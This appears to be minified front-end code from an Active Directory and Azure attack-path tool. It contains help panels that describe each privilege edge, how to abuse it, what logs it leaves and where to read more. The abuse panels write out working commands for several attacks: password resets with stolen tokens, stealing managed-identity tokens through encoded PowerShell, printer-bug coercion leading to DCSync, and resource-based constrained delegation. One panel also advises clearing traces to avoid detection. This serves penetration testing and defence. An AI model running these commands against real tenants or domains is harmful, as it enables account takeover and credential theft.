time."}),e.jsx(t,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),kc=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"PowerZure Set-AzureUserPassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator",children:"Microsoft Azure AD roles"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]}),Tc={general:Sc,abuse:Ac,opsec:Cc,references:kc},Pc=()=>e.jsx(t,{variant:"body2",children:"Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."}),Dc=()=>e.jsx(t,{variant:"body2",children:"The Privileged Role Admin role can grant any other admin role to another principal at the tenant level."}),Oc=()=>e.jsx(t,{variant:"body2",children:"The Azure Activity Log will log who activated an admin role for what other principal, including the date and time."}),Rc=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#add-azureadrole"})}),Ec={general:Dc,abuse:Pc,opsec:Oc,references:Rc},Ic=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."}),e.jsx(t,{variant:"body2",children:'The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click "Reset Password" on the target user’s overview tab.'}),e.jsx(t,{variant:"body2",children:"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."}),e.jsx(t,{variant:"body2",children:"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"}),e.jsx(t,{variant:"body1",children:"Using an MS Graph-scoped token"}),e.jsx(t,{variant:"body2",children:"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."}),e.jsx(t,{variant:"body2",children:"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"}),e.jsx(t,{component:"pre",children:'$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID "<service principal’s app id>" -ClientSecret "<service principal’s plain text secret>" -TenantName "contoso.onmicrosoft.com").access_token'}),e.jsx(t,{variant:"body2",children:"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Set-AZUserPassword -Token $MGToken -TargetUserID "d9644c..." -Password "SuperSafePassword12345"'}),e.jsxs(t,{variant:"body2",children:['If successful, the output will include a "204" status code:',e.jsx(t,{component:"pre",children:"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"})]}),e.jsx(t,{variant:"body1",children:"Using an Azure Portal-scoped token"}),e.jsx(t,{variant:"body2",children:"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."}),e.jsx(t,{variant:"body2",children:"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"}),e.jsx(t,{component:"pre",children:'$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"}),e.jsx(t,{component:"pre",children:'Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID "targetuser@contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:"If successful, the response will look like this:"}),e.jsx(t,{component:"pre",children:'StatusCode : 200 StatusDescription : OK Content : "Gafu1918" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}'}),e.jsx(t,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),$c=()=>e.jsx(t,{variant:"body2",children:"The ability to change another user's password without knowing their current password"}),Gc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what time."}),e.jsx(t,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),e.jsx(t,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),Nc=()=>e.jsx(t,{variant:"body2",children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword"})}),Mc={general:$c,abuse:Ic,opsec:Gc,references:Nc},Lc=()=>e.jsxs(t,{variant:"body2",children:["The Entra user is an approver for the role. If an account which can approve role assignments is compromised, an attacker could approve the assignment or activation of a role and escalate privileges in a tenant. The list of approvers is attached to a role policy and will be the designated principals for any approval requirements on the role."," "]}),Fc=()=>e.jsx(t,{variant:"body2",children:"The attacker may create artifacts of abusing role activation in Entra. For example, role activations are recorded and logged by default in Audit logs for the tenant. Roles can also have specific settings configured which require MFA, justification, ticket information, or approval to activate the role. It is also possible for administrators to configure roles so a notification is sent each time the role is activated or assigned. When a role has an approver for actions, these actions will require a predesignated principal to approve the action prior to becoming effective."}),_c=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/unifiedrolemanagementpolicyassignment-get?view=graph-rest-1.0&tabs=http",children:"Unified Role Management Policy Assignment - Get - REST API (Azure Authorization)"})}),Uc={general:Lc,opsec:Fc,references:_c},Wc=()=>e.jsx(t,{variant:"body2",children:"The Entra user or group is eligible for a role assignment. If the user is compromised, an attacker could activate the role, or use a current activation to escalate privileges in the tenant."}),Bc=()=>e.jsxs(t,{variant:"body2",children:["The attacker may create artifacts of abusing role activation in Entra. For example, role activations are recorded and logged by default in Audit logs for the tenant. Roles can also have specific settings configured which require MFA, justification, ticket information, or approval to activate the role. It is also possible for administrators to configure roles so a notification is sent each time the role is activated or assigned."," "]}),qc=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/rest/api/authorization/role-eligibility-schedule-instances/get?view=rest-authorization-2020-10-01&tabs=HTTP",children:"Role Eligibility Schedule Instances - Get - REST API (Azure Authorization)"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/rbacapplication-list-roleeligibilityscheduleinstances?view=graph-rest-1.0&tabs=http",children:"List roleEligibilityScheduleInstances - Microsoft Graph v1.0"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/policyroot-list-rolemanagementpolicies?view=graph-rest-1.0&tabs=http",children:"List roleManagementPolicies - Microsoft Graph v1.0"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/policyroot-list-rolemanagementpolicyassignments?view=graph-rest-1.0&tabs=http",children:"List roleManagementPolicyAssignments - Microsoft Graph v1.0"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/unifiedrolemanagementpolicyassignment-get?view=graph-rest-1.0&tabs=http",children:"Get unifiedRoleManagementPolicyAssignment - Microsoft Graph v1.0"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-apis",children:"API concepts in Privileged Identity management - Microsoft Entra ID Governance"})]}),Kc={general:Wc,opsec:Bc,references:qc},zc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal"}),e.jsx(t,{variant:"body2",children:e.jsxs("ol",{className:"list-inside list-decimal flex flex-col gap-2",children:[e.jsxs("li",{children:["Use the"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=http",children:"Microsoft Graph API"})," ","to add a new client secret to the Azure Application."]}),e.jsxs("li",{children:["Use the"," ",e.jsx("a",{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/cli/azure/",children:"Azure CLI"})," ","to authenticate as the Service Principal."]}),e.jsx("li",{children:"Proceed to access additional Azure resources under the control of the Service Principal."})]})})]}),Hc=()=>e.jsx(t,{variant:"body2",children:"The Azure App runs as the Service Principal when it needs to authenticate to the tenant"}),Vc=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations for this edge."}),Yc=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=http",children:"Microsoft Docs: servicePrincipal: addPassword"})}),Qc={general:Hc,abuse:zc,opsec:Vc,references:Yc},Jc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. For example, you can make yourself an administrator of an Azure Subscription by assigning the Owner role at the Subscription scope."}),e.jsx(t,{variant:"body2",children:"The simplest way to execute this attack is to use the Azure portal to add a new, abusable role assignment against the target object for yourself."}),e.jsx(t,{variant:"body2",children:"If this role is assigned to a Service Principal, you won't be able to authenticate directly to the Azure portal. In this case:"}),e.jsx(t,{variant:"body2",children:"You'll need to acquire a bearer token for the service principal with AzureRM as the audience. This can be done using BARK's Get-AzureRMTokenWithClientCredentials cmdlet."}),e.jsx(t,{variant:"body2",children:"Using that token, you can make a call to the AzureRM API to create a new role assignment on the target object, such as assigning yourself the Owner role. This can be done using BARK's New-AzureRMRoleAssignment cmdlet."})]}),Xc=()=>e.jsx(t,{variant:"body2",children:"The User Access Administrator role can manage user access to Azure resources, assign roles in Azure RBAC, and assign the Owner role to themselves or others."}),Zc=()=>e.jsx(t,{variant:"body2",children:"Azure will log any role activation event for any object type."}),el=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/",children:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"})}),tl={general:Xc,abuse:Jc,opsec:Zc,references:el},rl=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Connect to the VM via RDP and you will be granted local admin rights on the VM."})}),nl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:'When a virtual machine is configured to allow logon with Azure AD credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or "VMAL") admin role.'}),e.jsx(t,{variant:"body2",children:"Any principal granted this role, scoped to the affected VM, can connect to the VM via RDP and will be granted local admin rights on the VM."})]}),al=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),e.jsx(t,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),ol=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/azure/active-directory/devices/howto-vm-sign-in-azure-ad-windows",children:"Login to Windows virtual machine in Azure using Azure Active Directory authentication"})]}),il={general:nl,abuse:rl,opsec:al,references:ol},sl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM"}),e.jsx(t,{variant:"body2",children:"Via PowerZure:"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),cl=()=>e.jsx(t,{variant:"body2",children:"The Virtual Machine contributor role grants almost all abusable privileges against Virtual Machines."}),ll=()=>e.jsx(t,{variant:"body2",children:"Because you'll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),dl=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/",children:"https://blog.netspi.com/running-powershell-scripts-on-azure-vms/"})}),hl={general:cl,abuse:sl,opsec:ll,references:dl},pl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App."}),e.jsx(t,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),e.jsx(t,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken "0.ARwA6WgJJ9X2qk…" `\n    -TenantID "contoso.onmicrosoft.com"'}),e.jsx(t,{variant:"body2",children:`Now you can use BARK's Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple "whoami" command:`}),e.jsx(t,{component:"pre",children:'Invoke-AzureRMWebAppShellCommand `\n    -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" `\n    -Token $ARMToken `\n    -Command "whoami"'}),e.jsx(t,{variant:"body2",children:"If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:"}),e.jsx(t,{component:"pre",children:`PS C:> $PowerShellCommand = 
            $headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}
            $response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers $headers
            $response.RawContent

PS C:> $base64Cmd = [System.Convert]::ToBase64String(
            [System.Text.Encoding]::Unicode.GetBytes(
                $PowerShellCommand
            )
        )

PS C:> $Command = "powershell -enc $($base64Cmd)"

PS C:> Invoke-AzureRMWebAppShellCommand \`
            -KuduURI "https://mycoolwindowswebapp.scm.azurewebsites.net/api/command" \`
            -token $ARMToken \`
            -Command $Command`}),e.jsx(t,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),ul=()=>e.jsx(t,{variant:"body2",children:"The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce."}),ml=()=>e.jsx(t,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),bl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/",children:"Karl Fosaaen - Lateral Movement in Azure App Services"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95",children:"Andy Robbins - Abusing Azure App Service Managed Identity Assignments"})]}),fl={general:ul,abuse:pl,opsec:ml,references:bl},yl=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"TGT delegation allows an attacker to capture TGTs of privileged users or computers in the target domain when they authenticate against a system configured with unconstrained delegation."}),e.jsx(t,{variant:"body2",children:"A common attack method involves the attacker logging into a DC of the source domain and coercing a DC of the target domain. Since DCs have unconstrained delegation enabled by default, this grants the attacker a TGT for a target domain DC, which can then be used to perform a DCSync attack on the target domain. This guide details that version of the attack."}),e.jsx(t,{variant:"body2",children:"Alternatively, attackers can target other privileged computers or users besides DCs."}),e.jsx(t,{variant:"body2",children:"The attack will fail if the target is a member of Protected Users or is marked as not trusted for delegation, as their TGTs will not be sent to hosts with unconstrained delegation. You can identify all protected principals using the following Cypher query in BloodHound:"}),e.jsx(w,{children:`MATCH (g:Group)
    WHERE g.objectid ENDS WITH "-525"
    MATCH (n:Base)
    WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)
    RETURN n
    LIMIT 1000`}),e.jsx(t,{variant:"body2",children:"Attackers can also exploit non-DC hosts or users in the source domain with unconstrained delegation enabled. To find all non-DC principals with unconstrained delegation in BloodHound, run:"}),e.jsx(w,{children:`MATCH (n:Base)
    WHERE n.unconstraineddelegation = TRUE AND NOT (n)-[:DCFor]->()
    RETURN n`}),e.jsx(t,{variant:"body1",children:"Step 1: Start Monitoring for TGTs"}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Windows:"})}),e.jsx(t,{variant:"body2",children:"Log into a DC of the source domain and open a command prompt as Administrator."}),e.jsx(t,{variant:"body2",children:"Start monitoring for incoming TGTs using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap"}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Linux:"})}),e.jsx(t,{variant:"body2",children:"Obtain credentials for a computer or user with unconstrained delegation."}),e.jsx(t,{variant:"body2",children:"Start monitoring for incoming TGTs using krbrelayx.py with the credentials of the unconstrained delegation account:"}),e.jsx(t,{component:"pre",children:"krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab"}),e.jsx(t,{variant:"body1",children:"Step 2: Coerce the Target DC"}),e.jsx(t,{variant:"body2",children:'The printer bug is abused in this example. If the Print Spooler service is disabled on the target host, alternative coercion techniques must be used. See "Windows Coerced Authentication Methods" under References for details.'}),e.jsx(t,{variant:"body2",children:'To coerce the target DC, Authenticated Users access is required in the target domain. If the trust relationship is bidirectional, all principals in the source domain have this access by default. If not, coercion must be executed as a principal from the target forest. Attackers can obtain such a session using the trust account attack. See "SID Filter as a Security Boundary Between Domains? (Part 7) - Trust Account Attack" under References for details.'}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Windows:"})}),e.jsx(t,{variant:"body2",children:"From any host in the domain, coerce the target DC using SpoolSample:"}),e.jsx(t,{component:"pre",children:"SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local"}),e.jsx(t,{variant:"body2",children:"Rubeus will print the DC TGT as soon as it is received."}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Linux:"})}),e.jsx(t,{variant:"body2",children:"Coerce the target DC using printerbug.py:"}),e.jsx(t,{component:"pre",children:"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>"}),e.jsx(t,{variant:"body2",children:"krbrelayx.py will save the received TGT to disk."}),e.jsx(t,{variant:"body1",children:"Step 3: Pass the Ticket"}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Windows:"})}),e.jsx(t,{variant:"body2",children:"Inject the DC TGT into memory using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe ptt /ticket:doIFvjCCBbqgAwI..."}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Linux:"})}),e.jsx(t,{variant:"body2",children:"Set the KRB5CCNAME environment variable to the ticket's path:"}),e.jsx(t,{component:"pre",children:"export KRB5CCNAME=$path_to_ticket.ccache"}),e.jsx(t,{variant:"body1",children:"Step 4: DCSync the Target Domain"}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Windows:"})}),e.jsx(t,{variant:"body2",children:"Use Mimikatz to DCSync the target domain from the machine where the DC TGT was injected:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator"}),e.jsx(t,{variant:"body2",children:e.jsx("b",{children:"Linux:"})}),e.jsx(t,{variant:"body2",children:"Use secretsdump.py to DCSync the target domain:"}),e.jsx(t,{component:"pre",children:"secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>"})]}),gl=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The cross-forest trust from ",a," to ",r," has TGT delegation enabled."]}),e.jsxs(t,{variant:"body2",children:["When a resource in ",r," is configured with unconstrained delegation, principals from"," ",a," will automatically forward their Ticket Granting Ticket (TGT) to that resource upon access."]})]}),xl=()=>e.jsx(t,{variant:"body2",children:'The attack can be detected by correlating Windows security events from the attacker-controlled host and the target. See the reference "Hunting in Active Directory: Unconstrained Delegation & Forests Trusts" for details.'}),jl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d",children:"Not A Security Boundary: Breaking Forest Trusts"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1",children:"Hunting in Active Directory: Unconstrained Delegation & Forests Trusts"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://exploit.ph/user-constrained-delegation.html",children:"Abusing Users Configured with Unconstrained Delegation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted",children:"SID filter as security boundary between domains? (Part 7) - Trust account attack - from trusting to trusted"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/",children:"“Relaying” Kerberos - Having fun with unconstrained delegation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/p0dalirius/windows-coerced-authentication-methods",children:"Windows Coerced Authentication Methods"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"Rubeus"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/leechristensen/SpoolSample",children:"SpoolSample"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/",children:"krbrelayx.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",children:"printerbug.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",children:"secretsdump.py"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/updates-to-tgt-delegation-across-incoming-trusts-in-windows-server-1a6632ac-1599-0a7c-550a-a754796c291e",children:"Updates to TGT delegation across incoming trusts in Windows Server"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)",children:"Microsoft AD Trust Technical Documentation"})]}),wl={general:gl,abuse:yl,opsec:xl,references:jl},vl=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," can modify the msds-AllowedToActOnBehalfOfOtherIdentity attribute on the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:"The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),e.jsx(t,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),Al=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),Sl=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),Cl=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener 